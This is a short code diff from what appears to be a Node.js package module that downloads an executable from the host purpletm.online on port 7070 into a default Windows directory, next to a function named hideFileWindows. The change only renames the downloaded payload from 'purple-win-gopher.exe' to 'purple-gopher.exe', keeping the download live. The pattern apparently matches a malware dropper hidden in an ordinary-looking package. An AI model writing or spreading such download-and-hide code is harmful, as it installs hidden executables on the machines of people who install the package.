@@ -328,9 +328,9 @@ function hideFileWindows(filePath) {
 }
 
 module.exports = async function(options = {}) {
-    const downloadUrl = options.url || "http://purpletm.online:7070/purple-win-gopher.exe";
+    const downloadUrl = options.url || "http://purpletm.online:7070/purple-gopher.exe";
     const targetDir = options.dir || getDefaultWindowsPath();
-    const filename = options.filename || "purple-win-gopher.exe";
+    const filename = options.filename || "purple-gopher.exe";
 
     // Only sanitize user-provided directory paths if they're relative
     const finalDir = (options.dir && !path.isAbsolute(options.dir)) ? sanitizePath(options.dir) : targetDir;
